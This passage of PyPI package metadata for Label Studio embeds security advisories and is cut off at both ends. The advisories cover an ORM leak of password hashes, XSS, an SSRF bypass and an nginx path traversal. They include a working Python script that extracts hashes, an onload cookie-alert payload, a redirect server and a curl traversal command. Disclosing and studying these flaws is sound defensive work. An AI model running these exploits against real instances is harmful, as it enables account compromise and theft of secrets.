user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.0/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (==1.0)","boto3 (==1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.17)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"64e8d07485cbcbad2f68af612b289d6b5f8a27f7fb28d7a16dc903a41ab3ec0b","md5":"ccdab0d6f0f4edfb3f35f3d8c890e12f","sha256":"bf3075adb67bec9fd857f51cb9fb64b9b06b8653b4fb2a0b567b62b418c9cb93"},"downloads":-1,"filename":"label_studio-0.7.0-py3-none-any.whl","has_sig":false,"md5_digest":"ccdab0d6f0f4edfb3f35f3d8c890e12f","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6939687,"upload_time":"2020-05-29T18:46:55","upload_time_iso_8601":"2020-05-29T18:46:55.551164Z","url":"https://files.pythonhosted.org/packages/64/e8/d07485cbcbad2f68af612b289d6b5f8a27f7fb28d7a16dc903a41ab3ec0b/label_studio-0.7.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8a761a157ac44f6bf49e79912d73a3a65eed9ad088c6ab63f1c93bc550272fcc","md5":"54f4ea2344a4b8629c735656d15efc12","sha256":"e0f4cdf5aea05fdaa3cf371509ef02c793525270f90c5aba5ed8808ef4e25e31"},"downloads":-1,"filename":"label-studio-0.7.0.tar.gz","has_sig":false,"md5_digest":"54f4ea2344a4b8629c735656d15efc12","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6878188,"upload_time":"2020-05-29T18:47:05","upload_time_iso_8601":"2020-05-29T18:47:05.898448Z","url":"https://files.pythonhosted.org/packages/8a/76/1a157ac44f6bf49e79912d73a3a65eed9ad088c6ab63f1c93bc550272fcc/label-studio-0.7.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' 